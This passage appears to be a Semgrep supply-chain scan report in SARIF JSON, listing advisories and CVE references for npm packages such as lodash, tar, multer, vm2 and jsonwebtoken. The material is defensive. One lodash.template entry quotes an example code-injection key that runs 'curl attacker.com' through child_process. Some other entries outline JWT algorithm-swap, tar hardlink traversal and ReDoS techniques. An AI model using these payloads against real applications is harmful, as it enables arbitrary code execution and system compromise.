[https://nvd.nist.gov/vuln/detail/CVE-2019-10744](https://nvd.nist.gov/vuln/detail/CVE-2019-10744)\n","text":"Affected versions of lodash, lodash-amd, lodash-es, and lodash.defaultsdeep are vulnerable to Improper Input Validation / Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'). The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-a4fd0e64-ce76-449c-8e09-743db9edce4e","id":"ssc-a4fd0e64-ce76-449c-8e09-743db9edce4e","name":"ssc-a4fd0e64-ce76-449c-8e09-743db9edce4e","properties":{"precision":"very-high","tags":["CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')","CWE-20: Improper Input Validation","HIGH CONFIDENCE","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-a4fd0e64-ce76-449c-8e09-743db9edce4e"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of braces are vulnerable to Excessive Platform Resource Consumption within a Loop / Uncontrolled Resource Consumption. The issue resides in `lib/parse.js`. If a malicious user sends imbalanced braces as input, this could lead to Memory Exhaustion."},"help":{"markdown":"Affected versions of braces are vulnerable to Excessive Platform Resource Consumption within a Loop / Uncontrolled Resource Consumption. The issue resides in `lib/parse.js`. If a malicious user sends imbalanced braces as input, this could lead to Memory Exhaustion.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-a958e8fa-d09b-ebe1-7d75-1e4136fbe2e9)\n - [https://github.com/advisories/GHSA-grv7-fg5c-xmjg](https://github.com/advisories/GHSA-grv7-fg5c-xmjg)\n - [https://nvd.nist.gov/vuln/detail/CVE-2024-4068](https://nvd.nist.gov/vuln/detail/CVE-2024-4068)\n","text":"Affected versions of braces are vulnerable to Excessive Platform Resource Consumption within a Loop / Uncontrolled Resource Consumption. The issue resides in `lib/parse.js`. If a malicious user sends imbalanced braces as input, this could lead to Memory Exhaustion."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-a958e8fa-d09b-ebe1-7d75-1e4136fbe2e9","id":"ssc-a958e8fa-d09b-ebe1-7d75-1e4136fbe2e9","name":"ssc-a958e8fa-d09b-ebe1-7d75-1e4136fbe2e9","properties":{"precision":"very-high","tags":["CWE-1050: Excessive Platform Resource Consumption within a Loop","CWE-400: Uncontrolled Resource Consumption","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-a958e8fa-d09b-ebe1-7d75-1e4136fbe2e9"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of vm2 are vulnerable to Improper Neutralization Of Special Elements Used In An Os Command ('Os Command Injection')."},"help":{"markdown":"Affected versions of vm2 are vulnerable to Improper Neutralization Of Special Elements Used In An Os Command ('Os Command Injection').\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-aa66b26b-de8a-4f15-ac57-57c713f557f9)\n - [https://github.com/advisories/GHSA-g644-9gfx-q4q4](https://github.com/advisories/GHSA-g644-9gfx-q4q4)\n - [https://nvd.nist.gov/vuln/detail/CVE-2023-37903](https://nvd.nist.gov/vuln/detail/CVE-2023-37903)\n","text":"Affected versions of vm2 are vulnerable to Improper Neutralization Of Special Elements Used In An Os Command ('Os Command Injection')."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-aa66b26b-de8a-4f15-ac57-57c713f557f9","id":"ssc-aa66b26b-de8a-4f15-ac57-57c713f557f9","name":"ssc-aa66b26b-de8a-4f15-ac57-57c713f557f9","properties":{"precision":"very-high","tags":["CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')","HIGH CONFIDENCE","OWASP-A01:2017 - Injection","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-aa66b26b-de8a-4f15-ac57-57c713f557f9"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of tar are vulnerable to Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') / Improper Link Resolution Before File Access ('Link Following'). In node-tar's unpack logic, hardlink entries are validated by normalizing the link path against the entry's parent directory but are actually created by resolving the link path against the extraction root. An attacker can craft a TAR with a hardlink whose linkpath passes the traversal check yet resolves outside the target directory—allowing creation of hardlinks to arbitrary files and enabling read or write access to sensitive host files."},"help":{"markdown":"Affected versions of tar are vulnerable to Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') / Improper Link Resolution Before File Access ('Link Following'). In node-tar's unpack logic, hardlink entries are validated by normalizing the link path against the entry's parent directory but are actually created by resolving the link path against the extraction root. An attacker can craft a TAR with a hardlink whose linkpath passes the traversal check yet resolves outside the target directory—allowing creation of hardlinks to arbitrary files and enabling read or write access to sensitive host files.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-ab0d68e2-2d7d-dcf8-dd0b-8d2b907409be)\n - [https://github.com/advisories/GHSA-34x7-hfp2-rc4v](https://github.com/advisories/GHSA-34x7-hfp2-rc4v)\n - [https://nvd.nist.gov/vuln/detail/CVE-2026-24842](https://nvd.nist.gov/vuln/detail/CVE-2026-24842)\n","text":"Affected versions of tar are vulnerable to Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') / Improper Link Resolution Before File Access ('Link Following'). In node-tar's unpack logic, hardlink entries are validated by normalizing the link path against the entry's parent directory but are actually created by resolving the link path against the extraction root. An attacker can craft a TAR with a hardlink whose linkpath passes the traversal check yet resolves outside the target directory—allowing creation of hardlinks to arbitrary files and enabling read or write access to sensitive host files."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-ab0d68e2-2d7d-dcf8-dd0b-8d2b907409be","id":"ssc-ab0d68e2-2d7d-dcf8-dd0b-8d2b907409be","name":"ssc-ab0d68e2-2d7d-dcf8-dd0b-8d2b907409be","properties":{"precision":"very-high","tags":["CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')","CWE-59: Improper Link Resolution Before File Access ('Link Following')","HIGH CONFIDENCE","OWASP-A01:2021 - Broken Access Control","OWASP-A01:2025 - Broken Access Control","OWASP-A05:2017 - Broken Access Control","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-ab0d68e2-2d7d-dcf8-dd0b-8d2b907409be"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of tar are vulnerable to Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'). In node-tar's unpack logic, Link (hardlink) and SymbolicLink entries with absolute or \"..\" linkpaths aren't checked against the extraction root when preservePaths is false. An attacker-supplied archive can therefore create a hardlink to any writable file (bypassing the root restriction) to overwrite it, or drop a symlink pointing to a sensitive absolute path, leading to arbitrary file overwrite and symlink poisoning during extraction."},"help":{"markdown":"Affected versions of tar are vulnerable to Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'). In node-tar's unpack logic, Link (hardlink) and SymbolicLink entries with absolute or \"..\" linkpaths aren't checked against the extraction root when preservePaths is false. An attacker-supplied archive can therefore create a hardlink to any writable file (bypassing the root restriction) to overwrite it, or drop a symlink pointing to a sensitive absolute path, leading to arbitrary file overwrite and symlink poisoning during extraction.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-b6383582-549e-8975-031d-241b64fc5ac4)\n - [https://github.com/advisories/GHSA-8qq5-rm4j-mr97](https://github.com/advisories/GHSA-8qq5-rm4j-mr97)\n - [https://nvd.nist.gov/vuln/detail/CVE-2026-23745](https://nvd.nist.gov/vuln/detail/CVE-2026-23745)\n","text":"Affected versions of tar are vulnerable to Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'). In node-tar's unpack logic, Link (hardlink) and SymbolicLink entries with absolute or \"..\" linkpaths aren't checked against the extraction root when preservePaths is false. An attacker-supplied archive can therefore create a hardlink to any writable file (bypassing the root restriction) to overwrite it, or drop a symlink pointing to a sensitive absolute path, leading to arbitrary file overwrite and symlink poisoning during extraction."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-b6383582-549e-8975-031d-241b64fc5ac4","id":"ssc-b6383582-549e-8975-031d-241b64fc5ac4","name":"ssc-b6383582-549e-8975-031d-241b64fc5ac4","properties":{"precision":"very-high","tags":["CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')","HIGH CONFIDENCE","OWASP-A01:2021 - Broken Access Control","OWASP-A01:2025 - Broken Access Control","OWASP-A05:2017 - Broken Access Control","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-b6383582-549e-8975-031d-241b64fc5ac4"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of multer are vulnerable to Incomplete Cleanup. Improper handling of error states during file upload processing can leave file streams unconsumed, allowing repeated malformed requests to accumulate unreleased resources and potentially exhaust server memory or file descriptors."},"help":{"markdown":"Affected versions of multer are vulnerable to Incomplete Cleanup. Improper handling of error states during file upload processing can leave file streams unconsumed, allowing repeated malformed requests to accumulate unreleased resources and potentially exhaust server memory or file descriptors.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-b66ff60e-4e42-40c3-9231-86d7b67282f1)\n - [https://github.com/advisories/GHSA-xf7r-hgr6-v32p](https://github.com/advisories/GHSA-xf7r-hgr6-v32p)\n - [https://nvd.nist.gov/vuln/detail/CVE-2026-3304](https://nvd.nist.gov/vuln/detail/CVE-2026-3304)\n","text":"Affected versions of multer are vulnerable to Incomplete Cleanup. Improper handling of error states during file upload processing can leave file streams unconsumed, allowing repeated malformed requests to accumulate unreleased resources and potentially exhaust server memory or file descriptors."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-b66ff60e-4e42-40c3-9231-86d7b67282f1","id":"ssc-b66ff60e-4e42-40c3-9231-86d7b67282f1","name":"ssc-b66ff60e-4e42-40c3-9231-86d7b67282f1","properties":{"precision":"very-high","tags":["CWE-459: Incomplete Cleanup","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-b66ff60e-4e42-40c3-9231-86d7b67282f1"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"lodash versions prior to 4.17.21 (or lodash.template version 4.6.2) are vulnerable to Command Injection via the template function. Please remediate by updating to version 4.17.21 (or 4.6.2). https://github.com/advisories/GHSA-35jh-r3h4-6jhm"},"help":{"markdown":"lodash versions prior to 4.17.21 (or lodash.template version 4.6.2) are vulnerable to Command Injection via the template function. Please remediate by updating to version 4.17.21 (or 4.6.2). https://github.com/advisories/GHSA-35jh-r3h4-6jhm\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-c6bc1896-7044-4b22-b31a-753d52070423)\n - [https://github.com/advisories/GHSA-35jh-r3h4-6jhm](https://github.com/advisories/GHSA-35jh-r3h4-6jhm)\n - [https://nvd.nist.gov/vuln/detail/CVE-2021-23337](https://nvd.nist.gov/vuln/detail/CVE-2021-23337)\n","text":"lodash versions prior to 4.17.21 (or lodash.template version 4.6.2) are vulnerable to Command Injection via the template function. Please remediate by updating to version 4.17.21 (or 4.6.2). https://github.com/advisories/GHSA-35jh-r3h4-6jhm"},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-c6bc1896-7044-4b22-b31a-753d52070423","id":"ssc-c6bc1896-7044-4b22-b31a-753d52070423","name":"ssc-c6bc1896-7044-4b22-b31a-753d52070423","properties":{"precision":"very-high","tags":["CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')","CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')","CWE-94: Improper Control of Generation of Code ('Code Injection')","HIGH CONFIDENCE","OWASP-A01:2017 - Injection","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-c6bc1896-7044-4b22-b31a-753d52070423"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"minimatch 3.x before 3.0.5 is vulnerable to uncontrolled resource consumption. A user could cause a validation regex to experience catastrophic backtracking if user input is passed to `braceExpand(...)`. Upgrade to minimatch 3.0.5."},"help":{"markdown":"minimatch 3.x before 3.0.5 is vulnerable to uncontrolled resource consumption. A user could cause a validation regex to experience catastrophic backtracking if user input is passed to `braceExpand(...)`. Upgrade to minimatch 3.0.5.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-d0cedbca-8368-4baa-9b38-d246afca95e5)\n - [https://github.com/advisories/GHSA-f8q6-p94x-37v3](https://github.com/advisories/GHSA-f8q6-p94x-37v3)\n - [https://nvd.nist.gov/vuln/detail/CVE-2022-3517](https://nvd.nist.gov/vuln/detail/CVE-2022-3517)\n","text":"minimatch 3.x before 3.0.5 is vulnerable to uncontrolled resource consumption. A user could cause a validation regex to experience catastrophic backtracking if user input is passed to `braceExpand(...)`. Upgrade to minimatch 3.0.5."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-d0cedbca-8368-4baa-9b38-d246afca95e5","id":"ssc-d0cedbca-8368-4baa-9b38-d246afca95e5","name":"ssc-d0cedbca-8368-4baa-9b38-d246afca95e5","properties":{"precision":"very-high","tags":["CWE-1333: Inefficient Regular Expression Complexity","CWE-400: Uncontrolled Resource Consumption","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-d0cedbca-8368-4baa-9b38-d246afca95e5"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of jws are vulnerable to Use of a Broken or Risky Cryptographic Algorithm. A malicious actor can tamper with the JWT's `alg` header and jws will honor that algorithm choice when verifying the token. By switching to an unsupported or weaker algorithm (e.g. \"none\" or swapping between HMAC/RSA modes), an attacker can modify any field in the JWT and still pass signature validation, resulting in a straightforward bearer‐token authentication bypass."},"help":{"markdown":"Affected versions of jws are vulnerable to Use of a Broken or Risky Cryptographic Algorithm. A malicious actor can tamper with the JWT's `alg` header and jws will honor that algorithm choice when verifying the token. By switching to an unsupported or weaker algorithm (e.g. \"none\" or swapping between HMAC/RSA modes), an attacker can modify any field in the JWT and still pass signature validation, resulting in a straightforward bearer‐token authentication bypass.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-d3651a24-fc58-7ecc-19b7-21ba3e3d2052)\n - [https://github.com/advisories/GHSA-gjcw-v447-2w7q](https://github.com/advisories/GHSA-gjcw-v447-2w7q)\n - [https://nvd.nist.gov/vuln/detail/CVE-2016-1000223](https://nvd.nist.gov/vuln/detail/CVE-2016-1000223)\n","text":"Affected versions of jws are vulnerable to Use of a Broken or Risky Cryptographic Algorithm. A malicious actor can tamper with the JWT's `alg` header and jws will honor that algorithm choice when verifying the token. By switching to an unsupported or weaker algorithm (e.g. \"none\" or swapping between HMAC/RSA modes), an attacker can modify any field in the JWT and still pass signature validation, resulting in a straightforward bearer‐token authentication bypass."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-d3651a24-fc58-7ecc-19b7-21ba3e3d2052","id":"ssc-d3651a24-fc58-7ecc-19b7-21ba3e3d2052","name":"ssc-d3651a24-fc58-7ecc-19b7-21ba3e3d2052","properties":{"precision":"very-high","tags":["CWE-327: Use of a Broken or Risky Cryptographic Algorithm","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-d3651a24-fc58-7ecc-19b7-21ba3e3d2052"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of tar are vulnerable to Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') / Improper Link Resolution Before File Access ('Link Following'). `node-tar` can be abused during normal `tar.x()` extraction to write files outside the intended `cwd` by crafting a hardlink entry whose `linkpath` uses a drive-relative target like `C:../target.txt`. Because the unpack logic checks for `..` path traversal segments before stripping the absolute root (`C:`), the link target is rewritten to `../target.txt` after validation, allowing the extracted hardlink to resolve outside the extraction directory and enabling arbitrary file overwrite with the extractor's privileges."},"help":{"markdown":"Affected versions of tar are vulnerable to Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') / Improper Link Resolution Before File Access ('Link Following'). `node-tar` can be abused during normal `tar.x()` extraction to write files outside the intended `cwd` by crafting a hardlink entry whose `linkpath` uses a drive-relative target like `C:../target.txt`. Because the unpack logic checks for `..` path traversal segments before stripping the absolute root (`C:`), the link target is rewritten to `../target.txt` after validation, allowing the extracted hardlink to resolve outside the extraction directory and enabling arbitrary file overwrite with the extractor's privileges.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-d4117188-df1d-8856-27d7-223751823516)\n - [https://github.com/advisories/GHSA-qffp-2rhf-9h96](https://github.com/advisories/GHSA-qffp-2rhf-9h96)\n - [https://nvd.nist.gov/vuln/detail/CVE-2026-29786](https://nvd.nist.gov/vuln/detail/CVE-2026-29786)\n","text":"Affected versions of tar are vulnerable to Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') / Improper Link Resolution Before File Access ('Link Following'). `node-tar` can be abused during normal `tar.x()` extraction to write files outside the intended `cwd` by crafting a hardlink entry whose `linkpath` uses a drive-relative target like `C:../target.txt`. Because the unpack logic checks for `..` path traversal segments before stripping the absolute root (`C:`), the link target is rewritten to `../target.txt` after validation, allowing the extracted hardlink to resolve outside the extraction directory and enabling arbitrary file overwrite with the extractor's privileges."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-d4117188-df1d-8856-27d7-223751823516","id":"ssc-d4117188-df1d-8856-27d7-223751823516","name":"ssc-d4117188-df1d-8856-27d7-223751823516","properties":{"precision":"very-high","tags":["CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')","CWE-59: Improper Link Resolution Before File Access ('Link Following')","HIGH CONFIDENCE","OWASP-A01:2021 - Broken Access Control","OWASP-A01:2025 - Broken Access Control","OWASP-A05:2017 - Broken Access Control","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-d4117188-df1d-8856-27d7-223751823516"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of multer are vulnerable to Uncontrolled Recursion. Multer's `multipart/form-data` request handling is vulnerable to a denial of service: an attacker can send a malformed multipart upload request that triggers excessive/recursive processing and causes a stack overflow, crashing the Node.js process (or making the service unresponsive)."},"help":{"markdown":"Affected versions of multer are vulnerable to Uncontrolled Recursion. Multer's `multipart/form-data` request handling is vulnerable to a denial of service: an attacker can send a malformed multipart upload request that triggers excessive/recursive processing and causes a stack overflow, crashing the Node.js process (or making the service unresponsive).\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-d689b441-460e-4870-9334-5ce1a169bf6f)\n - [https://github.com/advisories/GHSA-5528-5vmv-3xc2](https://github.com/advisories/GHSA-5528-5vmv-3xc2)\n - [https://nvd.nist.gov/vuln/detail/CVE-2026-3520](https://nvd.nist.gov/vuln/detail/CVE-2026-3520)\n","text":"Affected versions of multer are vulnerable to Uncontrolled Recursion. Multer's `multipart/form-data` request handling is vulnerable to a denial of service: an attacker can send a malformed multipart upload request that triggers excessive/recursive processing and causes a stack overflow, crashing the Node.js process (or making the service unresponsive)."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-d689b441-460e-4870-9334-5ce1a169bf6f","id":"ssc-d689b441-460e-4870-9334-5ce1a169bf6f","name":"ssc-d689b441-460e-4870-9334-5ce1a169bf6f","properties":{"precision":"very-high","tags":["CWE-674: Uncontrolled Recursion","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-d689b441-460e-4870-9334-5ce1a169bf6f"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of multer are vulnerable to Uncaught Exception. A malicious actor can trigger a denial of service in Multer by submitting an upload request with an empty string for the file field name. This unhandled exception causes the process to crash when Multer attempts to process the request, creating a potentially serious availability issue."},"help":{"markdown":"Affected versions of multer are vulnerable to Uncaught Exception. A malicious actor can trigger a denial of service in Multer by submitting an upload request with an empty string for the file field name. This unhandled exception causes the process to crash when Multer attempts to process the request, creating a potentially serious availability issue.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-ddc75022-b0a6-5750-bfc6-1b80f123ba09)\n - [https://github.com/advisories/GHSA-g5hg-p3ph-g8qg](https://github.com/advisories/GHSA-g5hg-p3ph-g8qg)\n - [https://nvd.nist.gov/vuln/detail/CVE-2025-48997](https://nvd.nist.gov/vuln/detail/CVE-2025-48997)\n","text":"Affected versions of multer are vulnerable to Uncaught Exception. A malicious actor can trigger a denial of service in Multer by submitting an upload request with an empty string for the file field name. This unhandled exception causes the process to crash when Multer attempts to process the request, creating a potentially serious availability issue."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-ddc75022-b0a6-5750-bfc6-1b80f123ba09","id":"ssc-ddc75022-b0a6-5750-bfc6-1b80f123ba09","name":"ssc-ddc75022-b0a6-5750-bfc6-1b80f123ba09","properties":{"precision":"very-high","tags":["CWE-248: Uncaught Exception","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","OWASP-A10:2025 - Mishandling of Exceptional Conditions","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-ddc75022-b0a6-5750-bfc6-1b80f123ba09"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of lodash, lodash-amd, lodash-es, and lodash.template are vulnerable to Improper Control of Generation of Code ('Code Injection'). The fix for CVE-2021-23337 added validation for the variable option in _.template but did not apply the same validation to options.imports key names. Both paths flow into the same Function() constructor sink. When an application passes untrusted input as options.imports key names, an attacker can inject default-parameter expressions — for example, a key such as x=process.getBuiltinModule(\"child_process\").execSync(\"curl attacker.com\") — that execute arbitrary code at template compile time. Additionally, _.template uses assignInWith to merge imports, which enumerates inherited properties via for..in; if Object.prototype has been polluted by any prior gadget, the polluted keys are silently absorbed into the imports object and passed to Function(). NOTE: The package `lodash.template` has been depreacted and the author suggested to use `eta` instead."},"help":{"markdown":"Affected versions of lodash, lodash-amd, lodash-es, and lodash.template are vulnerable to Improper Control of Generation of Code ('Code Injection'). The fix for CVE-2021-23337 added validation for the variable option in _.template but did not apply the same validation to options.imports key names. Both paths flow into the same Function() constructor sink. When an application passes untrusted input as options.imports key names, an attacker can inject default-parameter expressions — for example, a key such as x=process.getBuiltinModule(\"child_process\").execSync(\"curl attacker.com\") — that execute arbitrary code at template compile time. Additionally, _.template uses assignInWith to merge imports, which enumerates inherited properties via for..in; if Object.prototype has been polluted by any prior gadget, the polluted keys are silently absorbed into the imports object and passed to Function(). NOTE: The package `lodash.template` has been depreacted and the author suggested to use `eta` instead.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-de7b6910-98c8-4dcd-bafb-32afb39a42d0)\n - [https://github.com/advisories/GHSA-35jh-r3h4-6jhm](https://github.com/advisories/GHSA-35jh-r3h4-6jhm)\n - [https://github.com/advisories/GHSA-r5fr-rjxr-66jc](https://github.com/advisories/GHSA-r5fr-rjxr-66jc)\n - [https://nvd.nist.gov/vuln/detail/CVE-2026-4800](https://nvd.nist.gov/vuln/detail/CVE-2026-4800)\n","text":"Affected versions of lodash, lodash-amd, lodash-es, and lodash.template are vulnerable to Improper Control of Generation of Code ('Code Injection'). The fix for CVE-2021-23337 added validation for the variable option in _.template but did not apply the same validation to options.imports key names. Both paths flow into the same Function() constructor sink. When an application passes untrusted input as options.imports key names, an attacker can inject default-parameter expressions — for example, a key such as x=process.getBuiltinModule(\"child_process\").execSync(\"curl attacker.com\") — that execute arbitrary code at template compile time. Additionally, _.template uses assignInWith to merge imports, which enumerates inherited properties via for..in; if Object.prototype has been polluted by any prior gadget, the polluted keys are silently absorbed into the imports object and passed to Function(). NOTE: The package `lodash.template` has been depreacted and the author suggested to use `eta` instead."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-de7b6910-98c8-4dcd-bafb-32afb39a42d0","id":"ssc-de7b6910-98c8-4dcd-bafb-32afb39a42d0","name":"ssc-de7b6910-98c8-4dcd-bafb-32afb39a42d0","properties":{"precision":"very-high","tags":["CWE-94: Improper Control of Generation of Code ('Code Injection')","HIGH CONFIDENCE","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-de7b6910-98c8-4dcd-bafb-32afb39a42d0"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of minimatch are vulnerable to Inefficient Regular Expression Complexity. `minimatch()` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing attacker-controlled extglob patterns: nested `*()` or `+()` extglobs are compiled into regexes with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which can trigger catastrophic backtracking in V8 and stall the Node.js event loop for seconds to minutes when matched against a crafted non-matching path string."},"help":{"markdown":"Affected versions of minimatch are vulnerable to Inefficient Regular Expression Complexity. `minimatch()` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing attacker-controlled extglob patterns: nested `*()` or `+()` extglobs are compiled into regexes with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which can trigger catastrophic backtracking in V8 and stall the Node.js event loop for seconds to minutes when matched against a crafted non-matching path string.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-de7e5e44-137c-659f-f78f-f8f8730411b4)\n - [https://github.com/advisories/GHSA-23c5-xmqv-rm74](https://github.com/advisories/GHSA-23c5-xmqv-rm74)\n - [https://nvd.nist.gov/vuln/detail/CVE-2026-27904](https://nvd.nist.gov/vuln/detail/CVE-2026-27904)\n","text":"Affected versions of minimatch are vulnerable to Inefficient Regular Expression Complexity. `minimatch()` is vulnerable to Regular Expression Denial of Service (ReDoS) when processing attacker-controlled extglob patterns: nested `*()` or `+()` extglobs are compiled into regexes with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which can trigger catastrophic backtracking in V8 and stall the Node.js event loop for seconds to minutes when matched against a crafted non-matching path string."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-de7e5e44-137c-659f-f78f-f8f8730411b4","id":"ssc-de7e5e44-137c-659f-f78f-f8f8730411b4","name":"ssc-de7e5e44-137c-659f-f78f-f8f8730411b4","properties":{"precision":"very-high","tags":["CWE-1333: Inefficient Regular Expression Complexity","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-de7e5e44-137c-659f-f78f-f8f8730411b4"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected version of jsonwebtoken are vulnerable to Improper Input Validation leading to a verification bypass vulnerability. This is a result of weak validation of the JWT algorithm type, occuring when an attacker is allowed to arbitrarily specify the JWT algorithm."},"help":{"markdown":"Affected version of jsonwebtoken are vulnerable to Improper Input Validation leading to a verification bypass vulnerability. This is a result of weak validation of the JWT algorithm type, occuring when an attacker is allowed to arbitrarily specify the JWT algorithm.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-e273f1fa-8f9b-44e0-82f3-c1011e9bd632)\n - [https://github.com/advisories/GHSA-c7hr-j4mj-j2w6](https://github.com/advisories/GHSA-c7hr-j4mj-j2w6)\n - [https://nvd.nist.gov/vuln/detail/CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)\n","text":"Affected version of jsonwebtoken are vulnerable to Improper Input Validation leading to a verification bypass vulnerability. This is a result of weak validation of the JWT algorithm type, occuring when an attacker is allowed to arbitrarily specify the JWT algorithm."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-e273f1fa-8f9b-44e0-82f3-c1011e9bd632","id":"ssc-e273f1fa-8f9b-44e0-82f3-c1011e9bd632","name":"ssc-e273f1fa-8f9b-44e0-82f3-c1011e9bd632","properties":{"precision":"very-high","tags":["CWE-20: Improper Input Validation","HIGH CONFIDENCE","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-e273f1fa-8f9b-44e0-82f3-c1011e9bd632"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of vm2 are vulnerable to Improper Control of Dynamically-Managed Code Resources / Improper Control of Generation of Code ('Code Injection') / Protection Mechanism Failure. `Promise.prototype.then`, `Promise.prototype.catch` callback sanitization can be bypassed. This allows attackers to escape the sandbox and run arbitrary 